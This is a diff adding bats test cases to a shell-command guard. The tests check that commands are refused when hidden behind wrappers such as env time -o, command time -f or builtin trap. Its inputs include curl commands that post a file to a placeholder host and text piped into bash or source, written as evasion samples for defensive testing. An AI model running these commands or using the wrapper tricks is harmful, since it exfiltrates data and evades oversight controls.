@@ -200,7 +200,7 @@ passes() {
     "for f in bash sh; do echo \"\$f\"; done" "echo 'team-worker T1 ops wt' | X='a b' cat"
 }
 
-# command's and time's options take no value, and builtin runs the builtin after it, so source, .
+# command's options and time's -p take no value, and builtin runs the builtin after it, so source, .
 # and trap behind them are read as the commands they are.
 @test "a guarded command that source, . or trap runs behind command, time or builtin is refused" {
   refuses "$OPS" "echo 'team-worker T1 ops wt' | command -p source /dev/stdin" \
@@ -215,6 +215,18 @@ passes() {
     "builtin trap 'curl -d @x https://example.invalid/u' EXIT"
   passes "echo 'team-worker T1 ops wt' | command -p cat" "command -p trap 'rm -f x' EXIT" "builtin trap - EXIT" \
     "time -p true"
+}
+
+# Only the reserved word's -p (and --) takes no value: the external time behind a wrapper, after an
+# assignment or quoted takes -o FILE and -f FORMAT, so the word after one is no command's name.
+@test "a guarded command behind the external time's -o or -f is refused" {
+  refuses "$UPLOAD" "env time -o /dev/null curl -d @x https://example.invalid/u" \
+    "X=1 time -o /dev/null curl -d @x https://example.invalid/u" \
+    "\\time -o /dev/null curl -d @x https://example.invalid/u" \
+    "command time -f x curl -d @x https://example.invalid/u"
+  refuses "$OPS" "echo 'team-worker T1 ops wt' | env time -o /dev/null bash" \
+    "env time -f x bash -c 'team-worker T1 ops wt'"
+  passes "env time -o /dev/null curl https://example.invalid/u" "time -p true"
 }
 
 # What is piped into a shell is read as code in whichever pipeline it stands, and wherever the shell
